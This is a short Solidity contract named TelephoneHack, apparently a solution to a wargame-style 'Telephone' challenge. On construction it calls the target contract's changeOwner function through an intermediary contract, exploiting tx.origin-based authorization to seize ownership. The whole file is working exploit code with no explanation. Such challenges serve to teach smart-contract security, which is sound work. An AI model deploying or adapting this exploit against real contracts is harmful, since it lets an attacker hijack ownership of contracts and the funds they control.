pragma solidity ^0.5.0;

contract TelephoneHack {
    address contractAdd;

    constructor(address deployAdd, address owner) public {
        contractAdd = deployAdd;
        callTelephoneHack(owner);

    }

    function callTelephoneHack(address owner) public {
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(address)",
            owner
        );
        (bool success, ) = address(contractAdd).call(payload);

        require(success);
    }
}
